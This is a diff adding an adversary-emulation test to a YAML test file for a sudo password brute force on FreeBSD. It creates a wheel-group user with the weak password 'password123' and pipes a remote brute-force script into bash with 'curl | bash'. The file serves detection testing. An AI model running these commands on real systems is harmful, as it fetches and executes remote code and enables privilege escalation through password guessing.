@@ -225,4 +225,40 @@ atomic_tests:
     cleanup_command: |
       userdel -fr art
 
+- name: SUDO Brute Force - FreeBSD
+  auto_generated_guid: 
+  description: |
+    An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. 
+
+    This test creates the "art" user with a password of "password123", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user
+  supported_platforms:
+  - freebsd
+  input_arguments:
+    remote_url:
+      description: url of remote payload
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      Check if running on a FreeBSD based machine.
+    prereq_command: |
+      if grep -iq "FreeBSD" /etc/os-release; then echo "FreeBSD"; else echo "NOT FreeBSD"; exit 1; fi
+      if [ -x "$(command -v openssl)" ]; then echo "openssl is installed"; else echo "openssl is NOT installed"; exit 1; fi
+      if [ -x "$(command -v sudo)" ]; then echo "sudo is installed"; else echo "sudo is NOT installed"; exit 1; fi
+      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
+      if [ -x "$(command -v bash)" ]; then echo "bash is installed"; else echo "bash is NOT installed"; exit 1; fi
+    get_prereq_command: |
+      pkg update && pkg install -y sudo curl bash
+  executor:
+    name: bash
+    elevation_required: true
+    command: |
+      pw adduser art -g wheel -s /bin/sh
+      echo "password123" | pw usermod art -h 0
+      su art
+      cd /tmp
+      curl -s #{remote_url} |bash
+    cleanup_command: |
+      rmuser -y art
 
